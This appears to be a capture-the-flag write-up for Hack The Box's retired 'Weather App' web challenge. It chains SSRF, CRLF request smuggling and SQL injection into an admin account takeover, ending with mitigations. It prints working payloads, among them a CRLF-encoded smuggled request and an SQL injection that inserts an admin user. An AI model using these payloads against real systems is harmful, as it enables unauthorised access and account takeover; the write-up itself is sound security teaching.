---
challenge: Weather App
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, nodejs, ssrf, response-splitting, sqli, account-takeover]
---

# Weather App — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Solved challenge; no real flags.

## TL;DR

**Source code is provided** (Node.js + Express). The frontend proxies to an internal weather API (`/api/weather`) and concatenates the city into the URL unsanitised: **SSRF**. Combined with **response splitting (CRLF)**, it smuggles a second HTTP request at the internal service, which also has **SQLi**. The result is an admin account with a known password, a login, and the flag.

## Brief

An app with a source download. A city field returns the weather. An internal service exists that is not exposed.

## Analysis

```bash
unzip weather-app.zip && cd app && npm install
grep -rn "http.get\|axios\|fetch\|request(" .
```

Key lines:

```js
// routes/weather.js
const city = req.body.city;
const url = `http://internal-api:3000/weather?city=${city}`;
http.get(url, ...)
```

The city is concatenated raw: no `encodeURIComponent`, no allowlist. The internal response is also copied back to the client, which allows **header injection**.

## Exploitation

### 1. Confirm SSRF

```bash
curl -s "http://<IP>:<port>/api/weather" -H 'Content-Type: application/json' \
  -d '{"city":"London"}'
```

### 2. Response splitting

The parameter travels inside the internal request URL. `%0d%0a` terminates that request and appends another:

```text
city=London%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aGET%20/admin%20HTTP/1.1
```

That reaches endpoints of the internal service the proxy does not expose.

### 3. SQLi in the internal service

The internal `city` parameter ends up in a query:

```text
London' UNION SELECT ... -- -
```

The injection creates (or modifies) a user with the `admin` role and a known password:

```sql
'; INSERT INTO users (username, password, role) VALUES ('admin','<known_hash>','admin'); -- -
```

### 4. Account takeover

```bash
curl -s -X POST "http://<IP>:<port>/login" \
  -d 'username=admin&password=<password>'
```

The admin session returns the flag on the dashboard.

## Pitfalls

- **Two encoding layers**: the city goes in JSON and then inside a URL; encode `%0d%0a` without letting the framework normalise it.
- **Internal host**: the service name is in the source (`internal-api`); no guessing needed.
- **Node version**: the old Node build is what permits CRLF request smuggling; on newer versions the vector disappears.
- **Quotes in SQLi**: if the filter blocks `'`, try numeric variants or `/**/`.

## Lessons

- Concatenating input into a URL is SSRF; concatenating it into a raw HTTP request is *response splitting*.
- A "trusted" internal service often has SQLi because it was never internet-facing.
- Mitigation: `encodeURIComponent`, host allowlists, an HTTP client that rejects CRLF, and parameterised queries.
